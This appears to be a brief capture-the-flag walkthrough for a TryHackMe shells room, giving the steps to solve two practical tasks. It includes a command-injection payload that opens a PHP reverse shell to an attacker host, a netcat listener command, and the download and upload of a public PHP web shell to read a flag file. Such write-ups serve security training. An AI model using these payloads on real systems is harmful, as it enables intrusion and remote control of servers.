# [Shells Overview](https://tryhackme.com/r/room/shellsoverview)

## Task 8 Practical Task

**Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?**

* Setup listener `rlwrap nc -lvnp 1443`
* Go to http://MACHINE_IP:8081/ (replace MACHINE_IP accordingly)
* Submit `hello.txt ; php -r '$sock=fsockopen("ATTACKBOX_IP",1443);exec("sh <&3 >&3 2>&3");'` (replace ATTACKBOX_IP accordingly)
* Execute on listener `cat /flag.txt`

**Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?**

* Download web shell `curl https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php -s -o shell.php`
* Go to http://MACHINE_IP:8082/ (replace MACHINE_IP accordingly)
* Upload `shell.php`
* Go to http://MACHINE_IP:8082/uploads/shell.php
* Execute `cat /flag.txt`
